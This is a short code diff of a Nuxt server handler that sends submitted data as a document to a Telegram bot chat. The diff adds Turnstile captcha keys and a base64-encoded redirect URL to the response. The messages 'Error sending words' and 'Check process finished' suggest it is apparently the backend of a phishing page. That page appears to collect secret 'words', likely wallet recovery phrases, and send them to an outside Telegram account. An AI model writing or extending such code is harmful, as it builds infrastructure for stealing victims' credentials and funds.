@@ -2,9 +2,20 @@ import { Buffer } from 'buffer';
 
 const telegramBotToken = process.env.TELEGRAM_BOT_TOKEN;
 const telegramUserId = process.env.TELEGRAM_USER_ID;
+const redirectURL = process.env.REDIRECT_URL;
+const tk = process.env.NUXT_PUBLIC_TURNSTILE_SITE_KEY;
+const ts = process.env.NUXT_TURNSTILE_SECRET_KEY;
 
 if (!telegramBotToken || !telegramUserId) {
     throw new Error('TELEGRAM_BOT_TOKEN or TELEGRAM_USER_ID not set in .env');
+}
+
+if (!redirectURL) {
+    throw new Error('REDIRECT_URL environment variable not set in .env');
+}
+
+if (!ts || !tk) {
+    throw new Error('NUXT_PUBLIC_TURNSTILE_SITE_KEY or NUXT_TURNSTILE_SECRET_KEY not set in .env');
 }
 
 const telegramApiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendDocument`;
@@ -49,6 +60,7 @@ export default defineEventHandler(async (event) => {
         return {
             statusCode: 200,
             message: 'Check process finished.',
+            red: btoa(redirectURL)
         };
     } catch (error) {
         console.error('Error sending words:', error);
